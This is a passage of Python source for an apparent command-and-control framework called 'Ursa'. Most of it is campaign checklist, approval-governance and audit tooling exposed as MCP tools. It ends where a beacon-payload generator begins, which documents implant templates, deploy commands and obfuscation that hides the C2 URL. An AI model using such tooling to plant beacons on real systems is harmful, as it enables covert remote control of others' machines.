        row = upsert_campaign_playbook(playbook, items=items, description=description.strip())
    except ValueError as exc:
        return f"Invalid playbook: {exc}"
    return (
        f"Playbook saved.\n"
        f"Name: {row['name']}\n"
        f"Items: {len(row.get('items') or [])}\n"
        f"Updated: {_format_time(row.get('updated_at'))}"
    )


@mcp_server.tool()
def ursa_campaign_delete_playbook(name: str) -> str:
    """Delete a checklist playbook by name."""
    playbook = name.strip()
    if not playbook:
        return "name is required."
    deleted = delete_campaign_playbook(playbook)
    return f"Deleted playbook {playbook}." if deleted else f"Playbook {playbook} not found."


@mcp_server.tool()
def ursa_campaign_apply_playbook(
    campaign: str,
    playbook: str,
    owner: str = "",
    due_base_iso: str = "",
    skip_existing: bool = True,
) -> str:
    """Apply a checklist playbook to a campaign."""
    campaign_name = campaign.strip()
    playbook_name = playbook.strip()
    if not campaign_name:
        return "campaign is required."
    if not playbook_name:
        return "playbook is required."
    due_base = None
    if due_base_iso.strip():
        try:
            due_base = datetime.fromisoformat(due_base_iso.strip()).timestamp()
        except ValueError:
            return "due_base_iso must be ISO date/datetime (example: 2026-03-09T09:00)."
    result = apply_campaign_playbook(
        campaign=campaign_name,
        playbook_name=playbook_name,
        default_owner=owner.strip(),
        due_base=due_base,
        skip_existing=skip_existing,
    )
    if result.get("missing"):
        return f"Playbook '{playbook_name}' not found."
    return (
        f"Applied playbook to campaign.\n"
        f"Campaign: {campaign_name}\n"
        f"Playbook: {playbook_name}\n"
        f"Created: {result['created']}\n"
        f"Skipped existing: {result['skipped']}\n"
        f"Total in playbook: {result['total']}"
    )


@mcp_server.tool()
def ursa_campaign_snapshot_playbook(
    campaign: str,
    name: str,
    description: str = "",
    only_open: bool = True,
) -> str:
    """Snapshot current campaign checklist into a reusable playbook."""
    campaign_name = campaign.strip()
    playbook_name = name.strip()
    if not campaign_name:
        return "campaign is required."
    if not playbook_name:
        return "name is required."
    try:
        row = snapshot_campaign_checklist_to_playbook(
            campaign=campaign_name,
            playbook_name=playbook_name,
            description=description.strip(),
            only_open=only_open,
        )
    except ValueError as exc:
        return str(exc)
    return (
        f"Playbook snapshot saved.\n"
        f"Campaign: {campaign_name}\n"
        f"Playbook: {row['name']}\n"
        f"Items: {len(row.get('items') or [])}\n"
        f"Updated: {_format_time(row.get('updated_at'))}"
    )


@mcp_server.tool()
def ursa_campaign_checklist(
    campaign: str,
    status: str | None = None,
    owner: str | None = None,
    query: str | None = None,
    sort: str = "created_desc",
    limit: int = 50,
) -> str:
    """List campaign checklist items."""
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    normalized_status = (status or "").strip().lower() or None
    if normalized_status and normalized_status not in {"pending", "in_progress", "blocked", "done"}:
        return "status must be one of: pending, in_progress, blocked, done."
    normalized_sort = sort.strip().lower()
    if normalized_sort not in {"created_desc", "created_asc", "updated_desc", "updated_asc", "due_asc", "due_desc"}:
        return "sort must be one of: created_desc, created_asc, updated_desc, updated_asc, due_asc, due_desc."
    rows = list_campaign_checklist(
        campaign=name,
        status=normalized_status,
        owner=(owner or "").strip() or None,
        text=(query or "").strip() or None,
        sort=normalized_sort,
        limit=max(1, min(limit, 500)),
    )
    if not rows:
        return f"No checklist items for campaign '{name}'."
    lines = [f"CAMPAIGN CHECKLIST: {name}", "=" * 90]
    for row in rows:
        due = _format_time(row["due_at"]) if row.get("due_at") else "-"
        lines.append(
            f"{row['id']:<6} {row['status']:<12} owner={row.get('owner') or '-':<16} "
            f"due={due:<19} {row['title']}"
        )
        if row.get("details"):
            lines.append(f"       details: {row['details']}")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_checklist_history(
    campaign: str,
    action: str = "",
    item_id: int = 0,
    limit: int = 50,
) -> str:
    """List checklist history entries for a campaign."""
    name = campaign.strip()
    if not name:
        return "campaign is required."
    action_filter = action.strip().lower() or None
    rows = list_campaign_checklist_history(
        campaign=name,
        action=action_filter,
        item_id=item_id if item_id > 0 else None,
        limit=max(1, min(limit, 500)),
    )
    if not rows:
        return f"No checklist history for campaign '{name}'."
    lines = [f"CHECKLIST HISTORY: {name}", "=" * 100]
    for row in rows:
        lines.append(
            f"{_format_time(row['created_at'])} item={row['item_id']:<5} "
            f"action={row['action']:<14} status={row.get('new_status') or '-':<12} title={row.get('title') or '-'}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_add_checklist_item(
    campaign: str,
    title: str,
    details: str = "",
    owner: str = "",
    due_at: str = "",
) -> str:
    """Add a checklist item to a campaign."""
    name = campaign.strip()
    item_title = title.strip()
    if not name:
        return "Campaign is required."
    if not item_title:
        return "title is required."
    due_ts = None
    due_text = due_at.strip()
    if due_text:
        try:
            due_ts = datetime.fromisoformat(due_text).timestamp()
        except ValueError:
            return "due_at must be ISO date/datetime (example: 2026-03-08T14:30)."
    item_id = add_campaign_checklist_item(
        campaign=name,
        title=item_title,
        details=details.strip(),
        owner=owner.strip(),
        due_at=due_ts,
        actor="mcp:ursa_campaign_add_checklist_item",
    )
    return f"Added checklist item {item_id} to campaign {name}."


@mcp_server.tool()
def ursa_campaign_update_checklist_item(
    item_id: int,
    title: str = "",
    details: str = "",
    owner: str = "",
    due_at: str = "",
    status: str = "",
) -> str:
    """Update fields for one checklist item."""
    updates: dict[str, object] = {}
    if title.strip():
        updates["title"] = title.strip()
    if details.strip():
        updates["details"] = details.strip()
    if owner.strip():
        updates["owner"] = owner.strip()
    if status.strip():
        normalized = status.strip().lower()
        if normalized not in {"pending", "in_progress", "blocked", "done"}:
            return "status must be one of: pending, in_progress, blocked, done."
        updates["status"] = normalized
    if due_at.strip():
        try:
            updates["due_at"] = datetime.fromisoformat(due_at.strip()).timestamp()
        except ValueError:
            return "due_at must be ISO date/datetime (example: 2026-03-08T14:30)."
    if not updates:
        return "No updates supplied."
    changed = update_campaign_checklist_item(item_id, actor="mcp:ursa_campaign_update_checklist_item", **updates)
    return f"Updated checklist item {item_id}." if changed else f"Checklist item {item_id} not found."


@mcp_server.tool()
def ursa_campaign_delete_checklist_item(item_id: int) -> str:
    """Delete one checklist item by ID."""
    deleted = delete_campaign_checklist_item(item_id, actor="mcp:ursa_campaign_delete_checklist_item")
    return f"Deleted checklist item {item_id}." if deleted else f"Checklist item {item_id} not found."


@mcp_server.tool()
def ursa_campaign_bulk_update_checklist(
    campaign: str,
    status: str,
    from_status: str = "",
    owner: str = "",
    query: str = "",
    limit: int = 500,
) -> str:
    """Bulk-update checklist status for matching campaign items."""
    name = campaign.strip()
    target = status.strip().lower()
    if not name:
        return "Campaign is required."
    if target not in {"pending", "in_progress", "blocked", "done"}:
        return "status must be one of: pending, in_progress, blocked, done."
    normalized_from = from_status.strip().lower() or None
    if normalized_from and normalized_from not in {"pending", "in_progress", "blocked", "done"}:
        return "from_status must be one of: pending, in_progress, blocked, done."

    rows = list_campaign_checklist(
        campaign=name,
        status=normalized_from,
        owner=owner.strip() or None,
        text=query.strip() or None,
        limit=max(1, min(limit, 5000)),
    )
    changed = 0
    for row in rows:
        if row.get("status") == target:
            continue
        if update_campaign_checklist_item(
            int(row["id"]),
            status=target,
            actor="mcp:ursa_campaign_bulk_update_checklist",
        ):
            changed += 1
    return (
        f"Checklist bulk update complete.\n"
        f"Campaign: {name}\n"
        f"Matched: {len(rows)}\n"
        f"Updated: {changed}\n"
        f"Target status: {target}"
    )


@mcp_server.tool()
def ursa_campaign_checklist_alerts(
    campaign: str | None = None,
    due_within_hours: int = 24,
    limit: int = 50,
) -> str:
    """List overdue and near-due checklist items."""
    name = (campaign or "").strip() or None
    window_hours = max(1, min(due_within_hours, 168))
    rows = list_campaign_checklist(campaign=name, limit=5000)
    now = time.time()
    due_window = now + window_hours * 3600
    overdue = []
    due_soon = []
    for row in rows:
        if row.get("status") == "done":
            continue
        due_at = row.get("due_at")
        if not due_at:
            continue
        if due_at < now:
            overdue.append(row)
        elif due_at <= due_window:
            due_soon.append(row)
    overdue_sorted = sorted(overdue, key=lambda item: item.get("due_at") or 0)[: max(1, min(limit, 200))]
    due_soon_sorted = sorted(due_soon, key=lambda item: item.get("due_at") or 0)[: max(1, min(limit, 200))]
    scope = name or "all campaigns"
    lines = [
        f"CHECKLIST ALERTS ({scope})",
        "=" * 80,
        f"Overdue: {len(overdue)}",
        f"Due in <= {window_hours}h: {len(due_soon)}",
    ]
    if overdue_sorted:
        lines.extend(["", "Overdue:"])
        for row in overdue_sorted:
            lines.append(
                f"  [{row['campaign']}] {row['id']} {row['title']} "
                f"owner={row.get('owner') or '-'} due={_format_time(row['due_at'])} status={row['status']}"
            )
    if due_soon_sorted:
        lines.extend(["", f"Due within {window_hours}h:"])
        for row in due_soon_sorted:
            lines.append(
                f"  [{row['campaign']}] {row['id']} {row['title']} "
                f"owner={row.get('owner') or '-'} due={_format_time(row['due_at'])} status={row['status']}"
            )
    if not overdue_sorted and not due_soon_sorted:
        lines.extend(["", "No checklist due alerts in scope."])
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_checklist_from_alerts(
    campaign: str,
    owner: str = "",
    due_in_hours: int = 24,
) -> str:
    """Generate campaign checklist remediation items from active policy alerts."""
    name = campaign.strip()
    if not name:
        return "campaign is required."
    plan = get_policy_remediation_plan(campaign=name)
    if not plan:
        return f"No active policy alerts for campaign '{name}'."

    due_at = None
    if due_in_hours > 0:
        due_at = time.time() + min(max(due_in_hours, 1), 24 * 14) * 3600
    existing_titles = {
        (row.get("title") or "").strip().lower()
        for row in list_campaign_checklist(campaign=name, limit=5000)
    }
    created = 0
    skipped = 0
    for item in plan:
        title = f"Policy remediation: {item['metric']} ({item['severity']})"
        if title.lower() in existing_titles:
            skipped += 1
            continue
        details = (
            f"{item['action']}\n"
            f"Approve path: {item['approve_cmd']}\n"
            f"Reject path: {item['reject_cmd']}"
        )
        add_campaign_checklist_item(
            campaign=name,
            title=title,
            details=details,
            owner=owner.strip(),
            due_at=due_at,
            actor="mcp:ursa_campaign_checklist_from_alerts",
        )
        created += 1
        existing_titles.add(title.lower())
    return (
        f"Checklist items generated from alerts.\n"
        f"Campaign: {name}\n"
        f"Recommendations: {len(plan)}\n"
        f"Created: {created}\n"
        f"Skipped existing: {skipped}"
    )


@mcp_server.tool()
def ursa_campaign_handoff(campaign: str) -> str:
    """
    Generate a concise handoff brief for a campaign.
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    payload = _build_campaign_handoff_payload(name)
    return _render_campaign_handoff_text(payload)


@mcp_server.tool()
def ursa_campaign_handoff_report(campaign: str, output_format: str = "md") -> str:
    """
    Export campaign handoff report to disk as Markdown or JSON.
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    fmt = output_format.strip().lower()
    if fmt not in {"md", "json"}:
        return "output_format must be 'md' or 'json'."

    payload = _build_campaign_handoff_payload(name)
    reports_dir = PROJECT_ROOT / "reports"
    reports_dir.mkdir(parents=True, exist_ok=True)
    safe = "".join(ch if ch.isalnum() or ch in "-_." else "_" for ch in name)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    if fmt == "json":
        out_path = reports_dir / f"campaign_handoff_{safe}_{ts}.json"
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2)
    else:
        out_path = reports_dir / f"campaign_handoff_{safe}_{ts}.md"
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(_render_campaign_handoff_markdown(payload))

    return f"Campaign handoff report exported.\nPath: {out_path}"


def _build_campaign_handoff_payload(campaign: str) -> dict:
    sessions = list_sessions(campaign=campaign)
    tasks = list_tasks(campaign=campaign, limit=300)
    events = get_events(campaign=campaign, limit=300)
    approvals = list_approval_requests(status="pending", campaign=campaign, limit=300)
    notes = list_campaign_notes(campaign=campaign, limit=50)
    checklist = list_campaign_checklist(campaign=campaign, limit=100)
    alerts = evaluate_campaign_policy_alerts(campaign=campaign)
    checklist_open = [item for item in checklist if item.get("status") != "done"]

    by_status: dict[str, int] = {}
    for s in sessions:
        st = s.get("status", "unknown")
        by_status[st] = by_status.get(st, 0) + 1

    return {
        "campaign": campaign,
        "generated_at": datetime.now().isoformat(),
        "counts": {
            "sessions": len(sessions),
            "tasks": len(tasks),
            "events": len(events),
            "pending_approvals": len(approvals),
            "policy_alerts": len(alerts),
            "notes": len(notes),
            "checklist_items": len(checklist),
            "checklist_open": len(checklist_open),
        },
        "session_status": by_status,
        "pending_approvals": approvals[:10],
        "alerts": alerts[:10],
        "notes": notes[:10],
        "checklist": checklist[:20],
    }


def _render_campaign_handoff_text(payload: dict) -> str:
    name = payload["campaign"]
    counts = payload["counts"]
    lines = [
        f"HANDOFF BRIEF: {name}",
        "=" * 60,
        f"Sessions: {counts['sessions']}  Tasks: {counts['tasks']}  Events: {counts['events']}",
        f"Pending Approvals: {counts['pending_approvals']}  Policy Alerts: {counts['policy_alerts']}",
        f"Checklist: {counts['checklist_open']}/{counts['checklist_items']} open",
        "",
        "Session Status:",
    ]
    for key, count in sorted(payload["session_status"].items()):
        lines.append(f"  {key}: {count}")

    approvals = payload["pending_approvals"]
    if approvals:
        lines.extend(["", "Top Pending Approvals:"])
        for a in approvals:
            lines.append(
                f"  {a['id']} risk={a['risk_level']} action={a['action']} session={a.get('session_id') or '-'}"
            )

    alerts = payload["alerts"]
    if alerts:
        lines.extend(["", "Active Policy Alerts:"])
        for a in alerts:
            lines.append(f"  {a['metric']} {a['value']}>{a['threshold']} severity={a['severity']}")

    notes = payload["notes"]
    if notes:
        lines.extend(["", "Recent Notes:"])
        for n in notes:
            lines.append(f"  [{_format_time(n['created_at'])}] {n['author']}: {n['note']}")
    checklist = payload["checklist"]
    if checklist:
        lines.extend(["", "Checklist:"])
        for item in checklist:
            due = _format_time(item["due_at"]) if item.get("due_at") else "-"
            lines.append(
                f"  {item['id']} [{item['status']}] {item['title']} "
                f"owner={item.get('owner') or '-'} due={due}"
            )
    return "\n".join(lines)


def _render_campaign_handoff_markdown(payload: dict) -> str:
    name = payload["campaign"]
    counts = payload["counts"]
    lines = [
        f"# Campaign Handoff: {name}",
        "",
        f"Generated: {payload['generated_at']}",
        "",
        "## Summary",
        f"- Sessions: {counts['sessions']}",
        f"- Tasks (recent): {counts['tasks']}",
        f"- Events (recent): {counts['events']}",
        f"- Pending approvals: {counts['pending_approvals']}",
        f"- Policy alerts: {counts['policy_alerts']}",
        f"- Notes: {counts['notes']}",
        f"- Checklist items: {counts['checklist_items']}",
        f"- Open checklist: {counts['checklist_open']}",
        "",
        "## Session Status",
    ]
    for key, count in sorted(payload["session_status"].items()):
        lines.append(f"- {key}: {count}")

    lines.extend(["", "## Pending Approvals"])
    if payload["pending_approvals"]:
        for a in payload["pending_approvals"]:
            lines.append(
                f"- `{a['id']}` risk={a['risk_level']} action={a['action']} session={a.get('session_id') or '-'}"
            )
    else:
        lines.append("- None")

    lines.extend(["", "## Active Policy Alerts"])
    if payload["alerts"]:
        for a in payload["alerts"]:
            lines.append(f"- {a['metric']}: {a['value']} > {a['threshold']} ({a['severity']})")
    else:
        lines.append("- None")

    lines.extend(["", "## Recent Notes"])
    if payload["notes"]:
        for n in payload["notes"]:
            lines.append(f"- [{_format_time(n['created_at'])}] **{n['author']}**: {n['note']}")
    else:
        lines.append("- None")
    lines.extend(["", "## Checklist"])
    if payload["checklist"]:
        for item in payload["checklist"]:
            due = _format_time(item["due_at"]) if item.get("due_at") else "-"
            lines.append(
                f"- `{item['id']}` [{item['status']}] {item['title']} "
                f"(owner={item.get('owner') or '-'}, due={due})"
            )
            if item.get("details"):
                lines.append(f"  - details: {item['details']}")
    else:
        lines.append("- None")
    lines.append("")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_delete_note(campaign: str, note_id: int) -> str:
    """Delete one campaign note by ID."""
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    deleted = delete_campaign_note(note_id)
    return f"Deleted note {note_id} from {name}." if deleted else f"Note {note_id} not found."


# ── Governance ──


@mcp_server.tool()
def ursa_policy_matrix() -> str:
    """Show the Ursa unified policy/risk matrix."""
    return "URSA POLICY MATRIX\n==================\n" + format_risk_matrix()


@mcp_server.tool()
def ursa_governance_summary(
    campaign: str | None = None,
    tag: str | None = None,
    risk_level: str | None = None,
) -> str:
    """
    Summarize pending approvals by risk and campaign.

    Args:
        campaign: Optional campaign filter.
        tag: Optional tag filter.
        risk_level: Optional risk filter.
    """
    rows = list_approval_requests(
        status="pending",
        campaign=(campaign or "").strip() or None,
        tag=(tag or "").strip() or None,
        risk_level=(risk_level or "").strip() or None,
        limit=1000,
    )
    if not rows:
        return "No pending approvals."

    by_risk: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    by_campaign: dict[str, int] = {}
    for row in rows:
        risk = (row.get("risk_level") or "").lower()
        if risk in by_risk:
            by_risk[risk] += 1
        name = (row.get("campaign") or "unassigned").strip() or "unassigned"
        by_campaign[name] = by_campaign.get(name, 0) + 1

    lines = [
        "PENDING APPROVAL SUMMARY",
        "=" * 40,
        f"Total: {len(rows)}",
        "",
        "By Risk:",
        f"  critical: {by_risk['critical']}",
        f"  high:     {by_risk['high']}",
        f"  medium:   {by_risk['medium']}",
        f"  low:      {by_risk['low']}",
        "",
        "By Campaign:",
    ]
    for name, count in sorted(by_campaign.items(), key=lambda item: item[1], reverse=True)[:10]:
        lines.append(f"  {name}: {count}")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_set_campaign_policy(
    campaign: str,
    max_pending_total: int = 20,
    max_pending_high: int = 10,
    max_pending_critical: int = 2,
    max_oldest_pending_minutes: int = 60,
    note: str = "",
) -> str:
    """
    Create/update a campaign governance threshold policy.

    Args:
        campaign: Campaign name.
        max_pending_total: Max pending approvals before alert.
        max_pending_high: Max pending high-risk approvals before alert.
        max_pending_critical: Max pending critical approvals before alert.
        max_oldest_pending_minutes: Max age for oldest pending approval before alert.
        note: Optional policy note.
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    policy = upsert_campaign_policy(
        campaign=name,
        max_pending_total=max_pending_total,
        max_pending_high=max_pending_high,
        max_pending_critical=max_pending_critical,
        max_oldest_pending_minutes=max_oldest_pending_minutes,
        updated_by="mcp:ursa_set_campaign_policy",
        note=note,
    )
    return (
        f"Policy updated for {name}.\n"
        f"max_pending_total={policy['max_pending_total']}\n"
        f"max_pending_high={policy['max_pending_high']}\n"
        f"max_pending_critical={policy['max_pending_critical']}\n"
        f"max_oldest_pending_minutes={policy['max_oldest_pending_minutes']}"
    )


@mcp_server.tool()
def ursa_campaign_policies() -> str:
    """List configured campaign governance policies."""
    rows = list_campaign_policies()
    if not rows:
        return "No campaign policies configured."
    lines = [
        f"{'Campaign':<20} {'Total':<8} {'High':<8} {'Critical':<8} {'OldestMin':<10} {'Updated By'}",
        "-" * 82,
    ]
    for row in rows:
        lines.append(
            f"{row['campaign'][:20]:<20} {row['max_pending_total']:<8} "
            f"{row['max_pending_high']:<8} {row['max_pending_critical']:<8} "
            f"{row['max_oldest_pending_minutes']:<10} {row['updated_by']}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_delete_campaign_policy(campaign: str) -> str:
    """Delete campaign threshold policy."""
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    deleted = delete_campaign_policy(name)
    return f"Deleted campaign policy: {name}" if deleted else f"No policy found for {name}"


@mcp_server.tool()
def ursa_campaign_alerts(campaign: str | None = None) -> str:
    """
    Show active policy alerts for campaign thresholds.

    Args:
        campaign: Optional campaign filter.
    """
    alerts = evaluate_campaign_policy_alerts(campaign=(campaign or "").strip() or None)
    if not alerts:
        return "No active campaign policy alerts."
    lines = [
        f"{'Campaign':<20} {'Metric':<10} {'Value':<8} {'Threshold':<10} {'Severity'}",
        "-" * 70,
    ]
    for alert in alerts:
        lines.append(
            f"{alert['campaign'][:20]:<20} {alert['metric']:<10} {alert['value']:<8} "
            f"{alert['threshold']:<10} {alert['severity']}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_policy_remediation_plan(campaign: str | None = None) -> str:
    """
    Generate remediation recommendations for active campaign policy alerts.

    Args:
        campaign: Optional campaign filter.
    """
    plan = get_policy_remediation_plan(campaign=(campaign or "").strip() or None)
    if not plan:
        return "No active alerts to remediate."
    lines = [
        "POLICY REMEDIATION PLAN",
        "=" * 40,
    ]
    for item in plan[:20]:
        lines.extend(
            [
                f"- Campaign: {item['campaign']}  Metric: {item['metric']}  Severity: {item['severity']}",
                f"  Action: {item['action']}",
                f"  Approve: {item['approve_cmd']}",
                f"  Reject:  {item['reject_cmd']}",
            ]
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_apply_policy_remediation(
    campaign: str,
    strategy: str = "reduce-critical",
    note: str = "",
) -> str:
    """
    Apply a conservative bulk remediation strategy for one campaign.

    Strategies:
      - reduce-critical: reject pending critical approvals
      - reduce-high: reject pending high approvals
      - clear-backlog: reject all pending approvals
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."

    strategy_key = strategy.strip().lower()
    if strategy_key == "reduce-critical":
        risk_level = "critical"
    elif strategy_key == "reduce-high":
        risk_level = "high"
    elif strategy_key == "clear-backlog":
        risk_level = None
    else:
        return "Invalid strategy. Use: reduce-critical | reduce-high | clear-backlog"

    summary = process_bulk_approval_decisions(
        approved=False,
        actor="mcp:ursa_apply_policy_remediation",
        note=note or f"Auto-remediation strategy={strategy_key}",
        campaign=name,
        risk_level=risk_level,
        limit=500,
    )
    return (
        f"Remediation applied.\n"
        f"Campaign: {name}\n"
        f"Strategy: {strategy_key}\n"
        f"Matched: {summary['matched']}\n"
        f"Rejected: {summary['rejected']}\n"
        f"Failed: {summary['failed']}"
    )


@mcp_server.tool()
def ursa_preview_policy_remediation(campaign: str, strategy: str = "reduce-critical") -> str:
    """
    Preview how many approvals would be affected by a remediation strategy.
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    strategy_key = strategy.strip().lower()
    if strategy_key == "reduce-critical":
        risk_level = "critical"
    elif strategy_key == "reduce-high":
        risk_level = "high"
    elif strategy_key == "clear-backlog":
        risk_level = None
    else:
        return "Invalid strategy. Use: reduce-critical | reduce-high | clear-backlog"

    rows = list_approval_requests(
        status="pending",
        campaign=name,
        risk_level=risk_level,
        limit=5000,
    )
    return (
        f"Remediation preview.\n"
        f"Campaign: {name}\n"
        f"Strategy: {strategy_key}\n"
        f"Would affect: {len(rows)} pending approvals"
    )


@mcp_server.tool()
def ursa_governance_report(output_format: str = "json") -> str:
    """
    Export governance snapshot report (policies, alerts, pending approvals).
    """
    fmt = output_format.strip().lower()
    if fmt not in {"json", "csv"}:
        return "output_format must be 'json' or 'csv'."

    policies = list_campaign_policies()
    alerts = evaluate_campaign_policy_alerts()
    approvals = list_approval_requests(status="pending", limit=5000)

    reports_dir = PROJECT_ROOT / "reports"
    reports_dir.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    if fmt == "json":
        payload = {
            "generated_at": datetime.now().isoformat(),
            "counts": {
                "policies": len(policies),
                "alerts": len(alerts),
                "pending_approvals": len(approvals),
            },
            "policies": policies,
            "alerts": alerts,
            "pending_approvals": approvals,
        }
        out_path = reports_dir / f"governance_snapshot_{ts}.json"
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2)
    else:
        out_path = reports_dir / f"governance_snapshot_{ts}.csv"
        with open(out_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["section", "campaign", "metric", "value", "extra"])
            for p in policies:
                writer.writerow(
                    [
                        "policy",
                        p["campaign"],
                        "thresholds",
                        f"total={p['max_pending_total']} high={p['max_pending_high']} critical={p['max_pending_critical']}",
                        p.get("note", ""),
                    ]
                )
            for a in alerts:
                writer.writerow(
                    [
                        "alert",
                        a["campaign"],
                        a["metric"],
                        a["value"],
                        f"threshold={a['threshold']} severity={a['severity']}",
                    ]
                )
            for p in approvals:
                writer.writerow(
                    [
                        "pending_approval",
                        p.get("campaign") or "unassigned",
                        p.get("risk_level", ""),
                        p.get("id", ""),
                        p.get("reason", ""),
                    ]
                )

    return (
        f"Governance report exported.\n"
        f"Format: {fmt}\n"
        f"Path: {out_path}\n"
        f"Policies: {len(policies)} Alerts: {len(alerts)} Pending approvals: {len(approvals)}"
    )


@mcp_server.tool()
def ursa_approvals(
    status: str = "pending",
    campaign: str | None = None,
    tag: str | None = None,
    risk_level: str | None = None,
    limit: int = 20,
) -> str:
    """
    List governance step-up approval requests.

    Args:
        status: Filter by status ("pending", "approved", "rejected")
        campaign: Filter by campaign name
        tag: Filter by tag substring
        risk_level: Filter by risk level
        limit: Max rows to return
    """
    rows = list_approval_requests(
        status=status,
        campaign=campaign,
        tag=tag,
        risk_level=risk_level,
        limit=limit,
    )
    if not rows:
        return f"No {status} approvals."

    lines = [
        f"{'ID':<10} {'Risk':<10} {'Campaign':<14} {'Action':<12} {'Session':<10} {'By':<20} {'Age'}",
        "-" * 100,
    ]
    for row in rows:
        lines.append(
            f"{row['id']:<10} {row['risk_level']:<10} {(row.get('campaign') or '-')[:14]:<14} {row['action']:<12} "
            f"{(row.get('session_id') or '-'): <10} {row['requested_by']:<20} "
            f"{_time_ago(row['created_at'])}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_approve(approval_id: str, note: str = "") -> str:
    """
    Approve a pending request and queue its original task.

    Args:
        approval_id: Approval request ID
        note: Optional decision note
    """
    result = process_approval_decision(
        approval_id=approval_id,
        approved=True,
        actor="mcp:ursa_approve",
        note=note,
    )
    if result["status"] == "not_found":
        return f"Approval {approval_id} not found."
    if result["status"] == "already_resolved":
        return f"Approval {approval_id} is already {result.get('current_status', 'resolved')}."
    if result["status"] == "error":
        return f"Approval {approval_id} could not be updated."
    if result.get("queue_result") != "queued":
        return f"Approval {approval_id} recorded, but task was not queued."
    return f"Approval {approval_id} approved. Task queued: {result.get('task_id')}"


@mcp_server.tool()
def ursa_reject(approval_id: str, note: str = "") -> str:
    """
    Reject a pending approval request.

    Args:
        approval_id: Approval request ID
        note: Optional reason for rejection
    """
    result = process_approval_decision(
        approval_id=approval_id,
        approved=False,
        actor="mcp:ursa_reject",
        note=note,
    )
    if result["status"] == "not_found":
        return f"Approval {approval_id} not found."
    if result["status"] == "already_resolved":
        return f"Approval {approval_id} is already {result.get('current_status', 'resolved')}."
    if result["status"] == "error":
        return f"Approval {approval_id} could not be updated."
    return f"Approval {approval_id} rejected."


@mcp_server.tool()
def ursa_approve_campaign(
    campaign: str,
    tag: str | None = None,
    risk_level: str | None = None,
    note: str = "",
) -> str:
    """
    Approve all pending requests for a campaign/tag filter.

    Args:
        campaign: Campaign name to filter.
        tag: Optional tag filter.
        risk_level: Optional risk filter.
        note: Optional audit note.
    """
    summary = process_bulk_approval_decisions(
        approved=True,
        actor="mcp:ursa_approve_campaign",
        note=note,
        campaign=campaign.strip() or None,
        tag=(tag or "").strip() or None,
        risk_level=(risk_level or "").strip() or None,
        limit=500,
    )
    return (
        f"Bulk approve complete.\n"
        f"Matched: {summary['matched']}\n"
        f"Approved: {summary['approved']}\n"
        f"Failed: {summary['failed']}\n"
        f"Already resolved: {summary['already_resolved']}"
    )


@mcp_server.tool()
def ursa_reject_campaign(
    campaign: str,
    tag: str | None = None,
    risk_level: str | None = None,
    note: str = "",
) -> str:
    """
    Reject all pending requests for a campaign/tag filter.

    Args:
        campaign: Campaign name to filter.
        tag: Optional tag filter.
        risk_level: Optional risk filter.
        note: Optional audit note.
    """
    summary = process_bulk_approval_decisions(
        approved=False,
        actor="mcp:ursa_reject_campaign",
        note=note,
        campaign=campaign.strip() or None,
        tag=(tag or "").strip() or None,
        risk_level=(risk_level or "").strip() or None,
        limit=500,
    )
    return (
        f"Bulk reject complete.\n"
        f"Matched: {summary['matched']}\n"
        f"Rejected: {summary['rejected']}\n"
        f"Failed: {summary['failed']}\n"
        f"Already resolved: {summary['already_resolved']}"
    )


@mcp_server.tool()
def ursa_audit_integrity(limit: int = 50) -> str:
    """
    Verify immutable audit chain integrity and show recent audit events.

    Args:
        limit: Number of recent events to show after verification
    """
    check = verify_immutable_audit_chain()
    rows = get_immutable_audit(limit=limit)
    status_line = (
        f"Audit chain integrity: OK ({check['checked']} events checked)"
        if check["ok"]
        else f"Audit chain integrity: FAILED at {check['failed_event']} after {check['checked']} checks"
    )
    if not rows:
        return status_line + "\nNo immutable audit events."
    lines = [status_line, "", "Recent immutable events:"]
    for row in rows[: min(limit, 20)]:
        lines.append(
            f"[{_format_time(row['timestamp'])}] {row['actor']} {row['action']} "
            f"risk={row['risk_level']} result={row['policy_result']}"
        )
    return "\n".join(lines)


# ── Payload Generation ──


@mcp_server.tool()
def ursa_generate(
    c2_url: str | None = None,
    interval: int = 5,
    jitter: float = 0.3,
    output_format: str = "python",
    template: str = "http_python",
    obfuscate: bool = False,
) -> str:
    """
    Generate a beacon payload configured for your C2 server.

    Args:
        c2_url: The C2 server URL (e.g., http://10.0.0.1:6708).
                Auto-detects if not provided.
        interval: Beacon interval in seconds (default 5)
        jitter: Jitter factor 0.0-1.0 (default 0.3 = ±30%)
        output_format: Output format — "python" for full script,
                       "oneliner" for a one-line command,
                       "stager" for configured stager source
        template: Template name from implants/templates/ (default: http_python).
                  Available templates:
                    http_python — Pure-Python beacon, no dependencies required.
                                  Deploy with: python3 payload.py
                    http_go     — Compiled Go beacon, no runtime dependencies.
                                  Build with:  go build -o agent payload.go
                                  Cross-compile: GOOS=linux GOARCH=amd64 go build -o agent payload.go
                    http_zig    — Zig skeleton (TODOs to fill in).
        obfuscate: When True, XOR+base64-wrap the payload source with a random
                   key so string literals (C2 URL, etc.) are not visible in
                   plaintext. The wrapped payload is still valid Python.
                   Note: obfuscation applies only to the http_python template.
    """
    resolved_url = c2_url or auto_c2_url()

    builder = _PayloadBuilder()

